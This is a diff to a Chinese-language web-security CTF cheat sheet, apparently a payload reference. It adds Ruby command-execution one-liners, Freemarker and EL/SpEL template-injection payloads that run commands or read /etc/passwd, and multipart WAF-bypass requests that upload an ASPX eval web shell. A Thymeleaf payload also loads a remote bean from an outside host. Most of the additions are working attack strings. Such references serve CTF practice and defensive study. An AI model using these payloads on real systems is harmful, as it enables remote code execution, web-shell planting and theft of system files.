@@ -29,14 +29,14 @@ Table of Contents
 *  [Serialization](#反序列化)
     * [PHP Serialize](#php---serialize--unserialize)
     * [Python Pickle](#python-pickle)
-    * [Ruby Marshal](#rubyrails-marshal)
-    * [Ruby YAML](#rubyrails-yaml)
+    * [Ruby Deserialization](#rubyrails-deserialization)
     * [Java Serialization](#java-deserialization)
     * [.NET Serialization](#net-derserialization)
 *  [SSTI / CSTI](#ssti)
     * [Flask/Jinja2](#flaskjinja2)
     * [Twig/Symfony](#twig--symfony)
     * [Thymeleaf](#thymeleaf)
+    * [Freemarker](#freemarker)
     * [Golang](#golang)
     * [AngularJS](#angularjs)
     * [Vue.js](#vuejs)
@@ -1036,6 +1036,7 @@ PS1=$(cat flag)
 - `open("| ls")`
 - `IO.popen("ls").read`
 - `Kernel.exec("ls")`
+- `Kernel.method("open").call("|ls").read()`
 - ``` `ls` ```
 - `system("ls")`
 - `eval("ruby code")`
@@ -1044,7 +1045,10 @@ PS1=$(cat flag)
         - `'' << 97 << 98 << 99` => "abc"
         - `$:`即`$LOAD_PATH`
 - `exec("ls")`
-- `%x{ls}`
+- `%x{ls}` / `%x'ls'` / `%x[ls]` / `%x(ls)` / `%x;ls;`
+- `"Process".constantize.spawn("id")`
+- `Process.spawn("id")`
+- `PTY.spawn("id")`
 - Net::FTP
     - CVE-2017-17405
     - use `Kernel#open`
@@ -1889,7 +1893,6 @@ end
 
 ## ORM injection
 
-https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications
 
 - Hibernate
     - 不支援 UNION 語法
@@ -1918,6 +1921,9 @@ https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-
             - `com.sun.java.help.impl.DocPConst.QUOTE`
             - `org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE`
             - `org.apache.logging.log4j.util.Chars.QUOTE`
+    - Reference
+        - https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications
+        - https://www.slideshare.net/slideshow/new-methods-for-exploiting-orm-injections-in-java-applications/62514298
 
 HQL injection example (pwn2win 2017)
 
@@ -2308,7 +2314,7 @@ HQL injection example (pwn2win 2017)
     - jspx
     - jsw
     - jsv
-    - jtml
+    - jhtml
 - .htaccess
     - set handler
     ```
@@ -2356,10 +2362,12 @@ HQL injection example (pwn2win 2017)
 
 ## 繞 WAF
 
+### Content-Disposition / filename / Form header
+
 - Java (commons-fileupload)
     - `filename` 前後塞 `%20`, `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%1c`, `%1d`, `%1e`, `%1f`
         - e.g. `Content-Disposition: form-data; name="file"; %1cfilename%0a="shell.jsp"`
-    - Quotable-Printable / Base64 編碼
+    - Quotable-Printable(QP) / Base64 編碼
         - `Content-Disposition: form-data; name="file"; filename="=?UTF-8?B?c2hlbGwuanNw?="`
         - `Content-Disposition: form-data; name="file"; filename="=?UTF-8?Q?=73=68=65=6c=6c=2e=6a=73=70?="`
     - Spring filename 編碼特性
@@ -2369,6 +2377,85 @@ HQL injection example (pwn2win 2017)
 - .NET (context.Request.files)
     - 抓上傳檔名只匹配 `Content-Disposition:` 後的 `filename=xxx`
     - `Content-Disposition:name="file"kaibrokaibrofilename=shell.aspx`
+- 不一致
+    - `filename=a.php; filename*=UTF-8''a`
+        - php: `a.php`
+        - golang: `a`
+        - Example: Codegate 2024 - Cha's Wall
+- Form header confusion
+    - `x=filename="1;/../shell.aspx";`
+        - WAF 視角: `x=filenmae="1;`
+        - 後端視角: `filename="1;/../shell.aspx"`
+- Content-Type confusion
+```
+Content-Type: application/x-www-form-urlencoded; multipart/form-data; boundary=x
+
+--x
+Content-Disposition: form-data; name="query";
+Content-Type: image/jpeg&action=search&query=aaa'or''='
+
+meow
+--x--
+```
+
+### Boundary
+
+Null Byte:
+
+```
+Content-Type: multipart/form-data; boundary=x
+
+--x\0
+Content-Disposition: form-data; name="path";
+
+../../../../etc/passwd
+--x\0
+```
+
+--
+
+Double Boundary (前後端解析不一致):
+
+```
+Content-Type: multipart/form-data; BOUNDARY=y:; boundary=x; 
+
+--x
+Content-Disposition: form-data; name="test";
+Content-Type: text/plain
+
+--y
+Content-Disposition: form-data; name="msg";
+Content-Type: text/plain
+
+1
+--y--
+--x--
+```
+(後端吃y, WAF吃x)
+
+--
+
+Combo (Double Boundary + Form header confusion + Content-type mutation):
+
+```
+Content-Type: multipart/form-data; BOUNDARY=y:; boundary=x; 
+
+--x
+Content-Disposition: form-data; name="x";
+
+1
+--x
+--y:
+Content-Disposition: form-data; name="file"; x=filename="1;/../shell.aspx";
+
+
+--x
+Content-Disposition: form-data; name="foo";
+Content-Type: <%@ Page Language="JScript"%><%eval(Request.Item["x"],"unsafe");%>
+
+--y:--
+--x--
+```
 
 ## 其他
 
@@ -2612,7 +2699,24 @@ uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdro
     - 影響 NumPy <=1.16.0
     - 底層使用 pickle
 
-## Ruby/Rails Marshal
+## Ruby/Rails Deserialization
+
+- `BAh`: Marshal serialized data 的 base64 編碼特徵
+
+### Gadget chain
+
+- Ruby Deserialization - Gadget on Rails by httpvoid (2022)
+    - https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md
+- Universal gadget for ruby 2.x-3.x by vakzz (2021)
+    - https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
+- PBCTF 2020 - R0bynotes (2020)
+    - ERB 無法用，改用 `ActiveModel::AttributeMethods::ClassMethods::CodeGenerator`
+- Universal gadget for ruby 2.x by elttam (2018)
+    - https://www.elttam.com/blog/ruby-deserialization/
+- ERB gadget chain
+    - https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md
+
+### Ruby Marshal
 
 this one is not self-executing
 
@@ -2639,7 +2743,7 @@ print marshalled
     - Rails 4.1 以前的 Cookie Serializer 為 Marshal
     - Rails 4.1 開始，默認使用 JSON
 
-## Ruby/Rails YAML
+### Ruby/Rails YAML
 
 - CVE-2013-0156
     - 舊版本的 Rails 中，`XML` 的 node 可以自訂 type，如果指定為 `yaml`，是會被成功解析的
@@ -2832,6 +2936,13 @@ Server-Side Template Injection
         - from Pew: `$__|{springRequestContext.getClass().forName("org.yaml.snakeyaml.Yaml").newInstance().load(thymeleafRequestContext.httpServletRequest.getParameter("a"))}|__(xx=id)?a=!!org.springframework.context.support.FileSystemXmlApplicationContext ["https://thegrandpewd.pythonanywhere.com/pwn.bean"]`
     - DEVCORE Wargame 2024 - Spring
         - thymeleaf 3.0.15: `__*{new.java.lang.String(new.java.lang.ProcessBuilder('/readflag', 'give','me','the','flag').start().getInputStream().readAllBytes())}__::.`
+
+## Freemarker
+
+- `${"freemarker.template.utility.Execute"?new()("calc")}`
+- `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`
+- `<#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}`
+- `<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","Calc").start()}`
 
 ## Golang
 
@@ -4385,6 +4496,21 @@ state[i] = state[i-3] + state[i-31]`
         - Example 2:
             - [justiceleague](https://github.com/GrrrDog/ZeroNights-HackQuest-2016)
         - Example 3: [VolgaCTF 2019 - shop](https://github.com/w181496/CTF/tree/master/volgactf2019_quals/shop)
+
+- EL Injection / SpEL Injection
+    - EL = Expression Language, SpEL = Spring Expression Language
+    - Some payload
+        - `${"a".toString()}`
+        - `${"".getClass()}`
+        - `${applicationScope}`
+        - `${sessionScope.toString()}`
+        - `${pageContext.request.getSession().setAttribute("admin", true)}` 
+        - `${T(java.lang.Runtime).getRuntime().exec("<my command here>")}`
+        - `${Class.forName('java.lang.Runtime').getRuntime().invoke(null).exec(<RCE>).getInputStream().read()}`
+        - `${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}`
+        - `${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}`
+    - Example
+        - [Seikai CTF 2023 - Frog WAF](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#frog-waf-29-solves)
 
 - HTTP2 Push
     - Server 自己 push 東西回來 (e.g. CSS/JS file)
